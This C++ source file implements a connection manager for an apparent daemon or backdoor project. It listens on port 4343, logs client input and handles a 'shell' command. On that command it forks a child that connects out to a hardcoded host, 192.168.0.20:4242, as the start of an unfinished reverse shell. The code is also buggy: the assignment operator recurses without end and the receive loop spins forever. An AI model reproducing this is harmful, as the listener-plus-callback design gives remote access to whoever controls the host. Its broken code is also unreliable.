#include "ConnectionManager.hpp"

ConnectionManager::ConnectionManager(void)
{
    return ;
}

ConnectionManager::ConnectionManager(Tintin_reporter *logger) : _logger(logger)
{
    _activeClients = 0;
    _listeningSocket = -1;
    return ;
}

ConnectionManager::~ConnectionManager(void)
{
    // destruct/unbind/unlink socket & stuff
    return ;
}


void    ConnectionManager::initSocket(void) {
    int     sockfd;
    int     one = 1;
    
    struct protoent *proto = getprotobyname("tcp");
    if ((sockfd = socket(PF_INET, SOCK_STREAM, proto->p_proto)) < 0
        || setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(int)) < 0) {
        _logger->log(LOGLVL_ERROR, "Could not create socket.");
        exit(EXIT_FAILURE);
    }

    _listeningSocket = sockfd;
    _sin.sin_family = AF_INET;
    _sin.sin_port = htons(4343);
    _sin.sin_addr.s_addr = INADDR_ANY;
    memset(&_sin.sin_zero, '\0', 8);
    
    if (bind(sockfd, (const struct sockaddr *)&_sin, sizeof(_sin)) < 0) {
        _logger->log(LOGLVL_ERROR, "Could not bind socket.");
        exit(EXIT_FAILURE);
    }

    if (listen(sockfd, MAX_CLIENTS) != 0) {
        _logger->log(LOGLVL_ERROR, "Socket could not enable listening.");
        exit(EXIT_FAILURE);
    }
    _logger->log(LOGLVL_INFO, "Socket is online");
    return ;
}

#include <netinet/tcp.h>
#include <fcntl.h>
void    ConnectionManager::handleIncoming(char **av) {
    struct timeval	tv;
    fd_set          recv_set;
    fd_set          master_set;

    FD_ZERO(&recv_set);
    FD_ZERO(&master_set);
    FD_SET(_listeningSocket, &master_set);

    while (true)
    {
        tv.tv_sec = 1;
	    tv.tv_usec = 0;
        recv_set = master_set;
        
        if (select(MAX_SELECT_FDS, &recv_set, NULL, NULL, &tv) == -1) {

            if (errno != EINTR)
            {
                _logger->log(LOGLVL_ERROR, "Select failed.");
                return ;
            }
            continue;
        }

        for (int currentFD = 0; currentFD < MAX_SELECT_FDS; currentFD++)
        {
            if (FD_ISSET(currentFD, &recv_set) != 0)
            {
                if (currentFD == _listeningSocket) {

                    int newfd;

                    if ((newfd = accept(_listeningSocket, NULL, NULL)) == -1) {
                        _logger->log(LOGLVL_WARN, "Error accepting client connection.");
                    } else {
                        if (_activeClients >= MAX_CLIENTS)
                        {
                            _logger->log(LOGLVL_WARN, "A client tried to connect, but no slot is avaible.");
                            close(newfd);
                            break ;
                        }
                        FD_SET(newfd, &master_set);
                        _activeClients++;
                        _logger->log(LOGLVL_INFO, "New client connection!");
                    }

                } else {
                    int     readBytes;
                    char    buf[512];

                    memset(&buf, '\0', 512);
                    if ((readBytes = recv(currentFD, buf, sizeof(buf), 0)) <= 0) {
                        if (readBytes == 0)
                            _logger->log(LOGLVL_INFO, "A client disconnected.");
                        else
                            _logger->log(LOGLVL_ERROR, "Critival receive error! Disconnecting client.");

                        close(currentFD);
                        FD_CLR(currentFD, &master_set);
                        _activeClients--;
                    }
                    else
                    {
                        buf[255] = '\0';
                        buf[strcspn(buf, "\n")] = '\0';
                        if (strncmp(buf, "quit", 5) == 0)
                            return ;
                        if (strncmp(buf, "shell", 6) == 0)
                        {
                            pid_t shellpop = fork();
                            if (shellpop == 0)
                            { // child
                               // dprintf(currentFD, "Spawning shell:\n");
int sockfd;
int one = 1;
                                struct protoent *proto = getprotobyname("tcp");
                if ((sockfd = socket(PF_INET, SOCK_STREAM, proto->p_proto)) < 0
                        || setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(int)) < 0) {
                    exit(1);
                }

    struct sockaddr_in _destAddr;

    _destAddr.sin_family = AF_INET;
    _destAddr.sin_port = htons(4242);
    _destAddr.sin_addr.s_addr = inet_addr("192.168.0.20");
    memset(&_destAddr.sin_zero, '\0', 8);


    connect(sockfd, (struct sockaddr*)&_destAddr, sizeof(struct sockaddr));

    int n = 0;
    while (1)
    {
        if ((n = recv(sockfd, buf, 256, 0)) <= 0) {
                printf ("Error receiving.\n");
        }

    }

                                
                                exit(EXIT_SUCCESS);
                            }
                            FD_CLR(currentFD, &master_set);
                            close(currentFD);
                        } else {
                            _logger->log(LOGLVL_INFO, "Received client data:");
                            _logger->log(LOGLVL_INFO, buf);
                            dprintf(currentFD, "Logged your input.");
                        }
                       
                    }

                }
            } 
        }

        int status = 0;
        pid_t childpid = waitpid(-1, &status, WNOHANG | WUNTRACED);
        //if (childpid != -1 && WIFEXITED(status))
           // _logger->log(LOGLVL_INFO, "Child has exited normally");


    }
    return ;
}


ConnectionManager &ConnectionManager::operator=(const ConnectionManager & rhs)
{
    if (this != &rhs)
        *this = rhs;
    return *this;
}

std::ostream &operator<<(std::ostream &out, ConnectionManager const & pm)
{
    (void)pm;
    out << "foobar" << std::endl;
    return out;
}